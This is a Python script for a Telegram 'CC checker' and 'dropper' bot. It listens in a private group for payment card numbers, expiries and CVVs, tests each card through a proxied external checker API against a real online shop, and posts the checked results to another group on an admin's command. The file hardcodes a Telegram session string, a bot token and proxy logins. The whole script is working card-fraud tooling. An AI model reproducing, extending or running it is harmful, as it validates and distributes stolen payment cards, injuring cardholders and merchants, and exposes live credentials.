import re
import aiohttp
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telegram import Bot
from telegram.helpers import escape_markdown
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import random

# ---------------- CONFIG ----------------
api_id = 17455551
api_hash = "abde39d2fad230528b2695a14102e76a"
SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"

PRIVATE_GROUP_ID = -1002682944548
TARGET_GROUP_ID = -1002968335063
ADMIN_ID = 8493360284  # Your Telegram ID

API_URL = "https://autosh.arpitchk.shop/puto.php"
SITE = "https://jasonwubeauty.com"

# List of proxies (rotate randomly)
PROXIES = [
    "45.41.172.51:5794:juftilus:atasaxde44jl",
    "45.41.177.238:5888:juftilus:atasaxde44jl",
    "92.113.7.244:6970:juftilus:atasaxde44jl",
    "108.165.197.189:6428:juftilus:atasaxde44jl",
    "23.27.209.235:6254:juftilus:atasaxde44jl",
    "82.29.225.78:5933:juftilus:atasaxde44jl",
    "23.27.184.87:5688:juftilus:atasaxde44jl",
    "31.59.27.148:6725:juftilus:atasaxde44jl",
    "67.227.113.12:5552:juftilus:atasaxde44jl"
]

# Regex to match multiple card formats
CARD_REGEX = re.compile(
    r"(\d{15,16})\s*[\/|]?\s*(\d{2})[\/|]?(\d{2,4})\s*[\/|]?\s*(\d{3,4})"
)

NUM_WORKERS = 15  # number of concurrent workers

# ---------------- CLIENTS ----------------
user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
bot_client = Bot(token=BOT_TOKEN)

# ---------------- STATE ----------------
dropping_enabled = False
cards_queue = asyncio.Queue()
session = None  # aiohttp session

# ---------------- FUNCTIONS ----------------
async def process_card(card: str):
    """Send card to API and forward result if dropping enabled"""
    global session
    proxy = random.choice(PROXIES)
    params = {"site": SITE, "cc": card, "proxy": proxy}

    try:
        async with session.get(API_URL, params=params, timeout=15) as resp:
            data = await resp.json()
    except Exception as e:
        data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
        print(f"❌ API error for card {card}: {e}")

    # Escape for MarkdownV2
    cc = escape_markdown(str(data.get('cc')), version=2)
    price = escape_markdown(str(data.get('Price')), version=2)
    response = escape_markdown(str(data.get('Response')), version=2)
    msg = f"CC: `{cc}`\nPrice: {price}\nResponse: {response}"

    if dropping_enabled:
        try:
            await bot_client.send_message(chat_id=TARGET_GROUP_ID, text=msg, parse_mode="MarkdownV2")
            print(f"[✓] Sent: {card} -> {data.get('Response')}")
        except Exception as e:
            print(f"❌ Failed to send card {card}: {e}")
    else:
        print(f"[i] Dropping disabled: {card} -> {data.get('Response')}")

async def card_worker(worker_id: int):
    """Worker to process queued cards"""
    print(f"[Worker-{worker_id}] Started")
    while True:
        card = await cards_queue.get()
        await process_card(card)
        cards_queue.task_done()

# ---------------- TELETHON EVENT ----------------
@user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
async def card_listener(event):
    text = event.message.message
    if not text:
        return
    matches = CARD_REGEX.findall(text)
    if not matches:
        return
    for match in matches:
        card_str = "|".join(match)
        await cards_queue.put(card_str)
        print(f"[+] Card queued: {card_str}")

# ---------------- TELEGRAM COMMANDS ----------------
async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id,
                                       text="✅ Send /drop to start dropping checked CC")
        print(f"[BOT] Admin {user_id} sent /start")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id,
                                       text="The OFFICIAL dropper of Card X CHK\nAccess Denied — bot only for official group")
        print(f"[BOT] Unauthorized /start by {user_id}")

async def drop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    global dropping_enabled
    if update.effective_user.id == ADMIN_ID:
        dropping_enabled = True
        await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Dropping enabled!")
        print("[BOT] Dropping enabled by admin")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Access Denied!")
        print(f"[BOT] Unauthorized /drop by {update.effective_user.id}")

async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    global dropping_enabled
    if update.effective_user.id == ADMIN_ID:
        dropping_enabled = False
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⏹ Dropping stopped.")
        print("[BOT] Dropping stopped by admin")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Access Denied!")
        print(f"[BOT] Unauthorized /stop by {update.effective_user.id}")

# ---------------- MAIN ----------------
async def main():
    global session
    session = aiohttp.ClientSession()  # Single shared session

    # Start Telethon client
    await user_client.start()
    print("✅ Telethon client started. Listening to private group...")

    # Start workers
    for i in range(NUM_WORKERS):
        asyncio.create_task(card_worker(i+1))
    print(f"[+] {NUM_WORKERS} card workers running...")

    # Start Telegram bot
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("drop", drop))
    app.add_handler(CommandHandler("stop", stop))

    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    print("✅ Telegram bot started. Waiting for admin commands...")

    # Keep running Telethon
    await user_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
